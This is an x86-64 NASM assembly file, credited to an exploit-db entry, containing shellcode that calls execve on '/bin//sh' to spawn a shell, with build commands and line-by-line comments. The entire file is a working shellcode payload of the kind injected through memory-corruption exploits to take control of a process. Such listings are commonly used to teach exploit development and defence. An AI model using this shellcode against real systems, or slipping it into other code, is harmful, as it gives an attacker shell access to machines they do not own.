;
;
; Source: https://www.exploit-db.com/exploits/47008
;
; Compile: nasm -felf64 spawn_shell.nasm -o spawn_shell.o
; Link: ld spawn_shell.o -o spawn_shell
;-----------------------------------------------------------
;
global _start

section .text

_start:

    ;int execve(const char *filename, char *const argv[],char *const envp[])
    xor     rsi,    rsi            ;clear rsi
    push    rsi                ;push null on the stack
    mov     rdi,    0x68732f2f6e69622f     ;/bin//sh in reverse order
    push    rdi
    push    rsp    
    pop    rdi                ;stack pointer to /bin//sh
    mov     al,    59            ;sys_execve
    cdq                    ;sign extend of eax
    syscall